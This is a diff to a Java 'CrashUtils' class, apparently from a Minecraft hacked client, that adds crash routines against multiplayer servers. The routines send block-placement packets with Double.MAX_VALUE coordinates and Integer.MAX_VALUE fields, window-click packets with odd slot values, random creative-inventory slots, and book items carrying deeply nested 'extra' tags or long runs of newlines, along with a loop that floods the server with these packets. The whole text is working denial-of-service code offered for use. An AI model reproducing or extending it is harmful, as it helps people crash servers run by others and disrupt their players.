@@ -14,6 +14,7 @@ import net.minecraft.network.play.client.*;
 import net.minecraft.util.BlockPos;
 import net.minecraft.util.EnumFacing;
 import org.apache.commons.lang3.RandomStringUtils;
+import scala.collection.parallel.ParIterableLike;
 
 import java.util.Random;
 import java.util.concurrent.ThreadLocalRandom;
@@ -81,13 +82,23 @@ public class CrashUtils {
                         , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
     }
 
+    public void placecrash(ItemStack stack) {
+        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
+                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
+                        , 1, stack, 0.0F, 0.0F, 0.0F));
+    }
+
+    public void placecrash2(ItemStack stack) {
+        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
+                (new BlockPos(Double.MAX_VALUE, 1.0, Double.MAX_VALUE)
+                        , Integer.MAX_VALUE, stack, Integer.MAX_VALUE, 1.0F, Integer.MAX_VALUE));
+    }
+
     public void payload1(ItemStack stack) {
         String channel;
         PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
         packetBuffer.writeItemStackToBuffer(stack);
         channel = "MC|BEdit";
-
-        System.out.println(channel);
         Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
     }
 
@@ -115,7 +126,17 @@ public class CrashUtils {
 
     public void click(ItemStack stack) {
         Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
-                (0, Integer.MIN_VALUE, 0, 0, stack, (short) 0));
+                (0, 0, 0, 1, stack, (short) 0));
+    }
+
+    public void click2(ItemStack stack) {
+        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
+                (0, 0, 0, 0, stack, (short) 0));
+    }
+
+    public void click3(ItemStack stack) {
+        Main.INSTANCE.packetQueue.add(new C0EPacketClickWindow
+                (0, -999, 0, 5, stack, (short) 0));
     }
 
     public void creatandclick(ItemStack stack) {
@@ -125,7 +146,7 @@ public class CrashUtils {
 
     public void justcreate(ItemStack stack) {
         Main.INSTANCE.packetQueue.add(new C10PacketCreativeInventoryAction
-                (36, stack));
+                (new Random().nextInt(Integer.MAX_VALUE), stack));
     }
 
     public void custombyte(int amount) {
@@ -138,12 +159,10 @@ public class CrashUtils {
         }
     }
 
-    public void crashdemo(String sign, int booktype, int bookvalue, int redo, boolean customedit, CrashType type, int amount, boolean setTag, int resolvebyte) {
-        int size;
+    public void crashdemo(String sign, int booktype, int bookvalue, int redo, boolean nullstring, CrashType type, int amount, boolean setTag, int resolvebyte) {
         NBTTagCompound compound = new NBTTagCompound();
         NBTTagList tagList = new NBTTagList();
         StringBuilder builder = new StringBuilder();
-
         Item hold;
 
         switch (booktype) {
@@ -151,27 +170,25 @@ public class CrashUtils {
                 hold = Items.writable_book;
                 break;
             case 1:
-                hold = Items.book;
-                break;
-            case 2:
             default:
                 hold = Items.written_book;
         }
 
-        if (customedit) {
-            builder.append(sign);
+        if (nullstring) {
+            for (int size = 0; size < 1350; ++size)
+                builder.append("\n");
         } else {
             builder.append("{");
-            for (size = 0; size < bookvalue; ++size) {
+            for (int size = 0; size < bookvalue; ++size) {
                 builder.append("extra:[{");
             }
-            for (size = 0; size < bookvalue; ++size) {
+            for (int size = 0; size < bookvalue; ++size) {
                 builder.append("text:").append(sign).append("}],");
             }
             builder.append("text:").append(sign).append("}");
         }
 
-        for (size = 0; size < redo; ++size)
+        for (int size = 0; size < redo; ++size)
             tagList.appendTag(new NBTTagString(builder.toString()));
 
         compound.setString("author", Minecraft.getMinecraft().getSession().getUsername());
@@ -182,10 +199,6 @@ public class CrashUtils {
 
         ItemStack stack = new ItemStack(hold);
         stack.setTagCompound(compound);
-
-        if (setTag)
-            stack.setTagInfo("pages", tagList);
-
 
         int packet = 0;
 
@@ -216,6 +229,18 @@ public class CrashUtils {
                 case CREATE:
                     justcreate(stack);
                     break;
+                case PLACE2:
+                    placecrash(stack);
+                    break;
+                case PLACE3:
+                    placecrash2(stack);
+                    break;
+                case CLICK2:
+                    click2(stack);
+                    break;
+                case CLICK3:
+                    click3(stack);
+                    break;
             }
         }
     }
@@ -223,14 +248,16 @@ public class CrashUtils {
     public void actioncrash(int amount) {
         int init = 0;
         while (init < amount) {
-            Main.INSTANCE.packetQueue.add(new C0APacketAnimation());
+            Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
+                    (new BlockPos(Double.MAX_VALUE, 1.0, Double.MAX_VALUE)
+                            , Integer.MAX_VALUE, Minecraft.getMinecraft().thePlayer.getHeldItem(), Integer.MAX_VALUE, 1.0F, Integer.MAX_VALUE));
             init++;
         }
     }
 
 
     public enum CrashType {
-        PLACE, CLICK, PAYLOAD1, PAYLOAD2, CAP, CAC, CAPL, CREATE, SIGN
+        PLACE, PLACE2, PLACE3, CLICK, CLICK2, CLICK3, PAYLOAD1, PAYLOAD2, CAP, CAC, CAPL, CREATE, SIGN,
     }
 
 
